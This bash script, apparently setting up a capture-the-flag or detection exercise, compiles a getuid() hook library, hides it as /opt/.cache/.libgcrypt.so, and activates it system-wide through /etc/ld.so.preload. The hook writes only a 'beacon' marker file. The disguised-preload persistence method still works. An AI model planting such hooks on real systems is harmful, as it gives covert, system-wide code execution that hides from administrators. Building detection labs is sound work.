#!/bin/bash
set -e

# Compile a small shared library that hijacks getuid() and drops a beacon
# marker on first call, then activate it via /etc/ld.so.preload.
if ! command -v gcc >/dev/null 2>&1; then
    DEBIAN_FRONTEND=noninteractive apt-get update -qq
    DEBIAN_FRONTEND=noninteractive apt-get install -y gcc
fi

install -d /opt/.cache

cat > /tmp/.build_preload.c <<'EOF'
#define _GNU_SOURCE
#include <dlfcn.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

uid_t getuid(void) {
    static uid_t (*real_getuid)(void) = 0;
    if (!real_getuid) {
        real_getuid = (uid_t (*)(void))dlsym(RTLD_NEXT, "getuid");
    }
    static int fired = 0;
    if (!fired) {
        fired = 1;
        int fd = open("/var/lib/.ctf-preload-marker", O_WRONLY | O_CREAT | O_APPEND, 0600);
        if (fd >= 0) {
            (void)write(fd, "beacon\n", 7);
            close(fd);
        }
    }
    return real_getuid ? real_getuid() : 0;
}
EOF

gcc -shared -fPIC -O2 -o /opt/.cache/.libgcrypt.so /tmp/.build_preload.c -ldl
rm -f /tmp/.build_preload.c
chmod 755 /opt/.cache/.libgcrypt.so

printf '/opt/.cache/.libgcrypt.so\n' > /etc/ld.so.preload
chmod 644 /etc/ld.so.preload

# Trigger the beacon once by running a command that calls getuid().
id -u >/dev/null 2>&1 || true
